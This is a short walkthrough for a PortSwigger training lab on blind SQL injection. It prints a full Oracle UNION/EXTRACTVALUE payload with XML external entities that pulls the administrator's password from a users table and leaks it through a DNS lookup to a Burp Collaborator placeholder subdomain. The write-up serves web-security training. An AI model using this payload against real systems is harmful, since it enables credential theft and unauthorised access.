# Lab-17: [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. 

The database contains a different table called ```users```, with columns called ```username``` and ```password```. You need to exploit the blind SQL injection vulnerability to find out the password of the ```administrator``` user. 

**Aim:-** To solve the lab, log in as the administrator user. 



## Solution 
- Capture a request in the burp suite

- Start the collaborator in the burp suite to make the DNS lookup

- Add ``` '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual-- ``` to the end of the **TrackingId** cookie
    - The DNS lookup query also contains a ``` SELECT ``` query to get the ``` administrator ``` password, so the query get the ``` administrator ``` password and make a DNS lookup request to the given server.

- Change the ``` BURP-COLLABORATOR-SUBDOMAIN ``` to the **collaborator sub-domain** and make the request

- Go to the **collaborator** and check for the **HTTP** requests, it will contain the ``` administrator ``` password 
    - The request will look like ( ``` password.collaborator-subdomain ``` ).